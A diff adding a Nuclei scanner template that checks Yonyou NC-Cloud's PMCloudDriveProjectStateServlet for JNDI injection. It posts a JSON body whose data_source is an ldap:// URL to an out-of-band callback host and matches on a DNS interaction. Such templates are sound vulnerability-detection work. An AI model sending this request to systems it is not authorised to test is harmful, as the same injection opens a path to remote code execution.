@@ -1,0 +1,24 @@
+id: yonyou-nccloud-pmclouddriveprojectstateservlet-jndi-injection
+info:
+  name: 用友NC-Cloud PMCloudDriveProjectStateServlet JNDI注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,rce
+
+http:
+  - raw:
+      - |
+        POST /service/~pim/PMCloudDriveProjectStateServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"data_source": "ldap://{{interactsh-url}}","user": ""}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: status
+        status:
+          - 200
